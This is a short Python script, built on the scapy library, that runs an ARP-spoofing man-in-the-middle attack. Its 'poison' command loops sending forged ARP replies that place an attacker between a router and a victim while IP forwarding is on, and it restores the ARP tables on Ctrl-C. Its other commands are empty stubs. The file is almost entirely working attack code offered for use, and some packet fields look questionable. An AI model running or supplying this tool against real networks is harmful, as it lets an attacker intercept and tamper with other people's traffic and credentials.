#!/usr/bin/env python


import argh
import time
import utils
import signal
import logging
from scapy.all import *


def _arp_registered_MAC(ip, interface=Ether):
    return srp(ARP(pdst=ip), timeout=5, retry=3)[0][1][interface].src


def poison(routerIP, victimIP, attackerIP, interface='eth0'):
    routerMAC = _arp_registered_MAC(routerIP)
    victimMAC = _arp_registered_MAC(victimIP)
    attackerMAC = _arp_registered_MAC(attackerIP)
    if not routerMAC or not victimMAC or not attackerMAC:
        logging.error('''Could not determine all parties MACs:\n
                      \t router   IP: {rip} \t MAC: {rmac} \n
                      \t victim   IP: {vip} \t MAC: {vmac} \n
                      \t attacker IP: {aip} \t MAC: {amac} \n
                      '''.format(rip=routerIP, rmac=routerMAC,
                                 vip=victimIP, vmac=victimMAC,
                                 aip=attackerIP, amac=attackerMAC))
        return

    def _signal_handler(signal, frame):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC))

    with utils.ip_forwarding():
        signal.signal(signal.SIGINT, _signal_handler)
        while True:
            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=attackerMAC, hwsrc=victimMAC), count=3)
            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=attackerMAC, hwsrc=routerMAC), count=3)
            time.sleep(2)


def verify():
    pass


def monitor():
    pass


def display():
    pass


if __name__ == '__main__':
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    argh.dispatch_commands([poison, verify, monitor, display])
